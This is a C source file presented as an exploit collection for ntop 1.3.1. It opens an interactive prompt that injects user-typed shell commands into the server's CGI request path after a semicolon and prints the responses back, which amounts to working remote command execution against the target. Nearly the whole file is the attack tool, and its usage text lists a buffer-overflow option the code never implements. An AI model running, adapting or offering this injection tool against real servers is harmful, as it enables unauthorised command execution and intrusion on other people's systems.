/*
** Exploit Collection for ntop 1.3.1.
**
** usage: nchop -c <cmd> -d -t <target> -p <port>
**
**
*/

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <ctype.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <errno.h>
#include "lib/error.h"
#include "lib/dns_lib.h"
#include "lib/stdnet.h"
#include "shellcode.h"


#define CGIPFX        "GET /cgi/bla;"
#define CGISFX        "HTTP/1.0"
#define MAXBUF        1024
#define CMDOPT        "a:dt:p:"
#define CMDSTR        "-d -t <target> -p <port>\n"\
                      "\t-a try to exploit bufferoverflow in handleHTTPrequest()\n"\
                      "\t-d debug\n"\
                      "\t-t target name/ip\n"\
                      "\t-p port number\n"
#define USAGE(pname)  err_mesg(FATAL, "usage:\t%s %s\n", pname, CMDSTR);


// Globals
char *pname;
u_int target_flag = 0, port_flag = 0, debug_flag = 0;

// Declare Functions
int attackCGI(char *target, int port);


/*
**   M A I N
*/
int main(int argc, char *argv[])
{
  int cmd;
  char *target_value;
  char *port_value;


  pname = argv[0];

  // get options
  opterr = 0;
  while((cmd = getopt(argc, argv, CMDOPT)) != EOF)
  {
    switch(cmd)
    {
      case 'd':
        debug_flag++;
        break;
      case 't':
        if(optarg == NULL)
          goto DEFAULT;
        target_flag++;
        target_value = strdup(optarg);
        break;
      case 'p':
        if(optarg == NULL)
          goto DEFAULT;
        port_flag++;
        port_value = strdup(optarg);
        break;
      default:
      DEFAULT:
        USAGE(argv[0])
    }
  }

  if(!target_flag || !port_flag)
    USAGE(argv[0])

  attackCGI(target_value, atoi(port_value));

  exit(0);
}


/*
** Attack Functions
*/
#define CMD_ABORT   "byebye"

int attackCGI(char *target, int port)
{
  int sock, n;
  char cmd[MAXBUF], httpbuf[2*MAXBUF];


  system("clear");

  while(1)
  {
    if((sock = tcp_open(target, NULL, port)) < 0)
      return(-1);

    printf("Nchop > ");
    if(fgets(cmd, sizeof(cmd), stdin) == NULL)
      break;

    cmd[strlen(cmd)-1] = '\0'; // delete \n

    if(!strncmp(cmd, CMD_ABORT, sizeof(CMD_ABORT)))
    {
      puts("Bye bye\n");
      break;
    }

    if(debug_flag)
      err_mesg(WARN, "attackCGI: reading command %s with length %d\n", cmd, strlen(cmd));

    sprintf(httpbuf, "GET /cgi/bla;%s HTTP/1.0%c%c%c%c", cmd, 0x0D, 0x0A, 0x0D, 0x0A);

    if(debug_flag)
      err_mesg(WARN, "attackCGI: Attack Vector: %s \n", httpbuf);

    if((n = writen(sock, httpbuf, strlen(httpbuf))) < 0)
      err_mesg(WARN_SYS, "attackCGI: write(%s)\nsyserr", httpbuf);

    memset(cmd, 0, sizeof(cmd));
    while(readline(sock, cmd, sizeof(cmd)) > 0)
      fputs(cmd, stderr);
    memset(cmd, 0, sizeof(cmd));

    close(sock);
  }

  return(0);
}



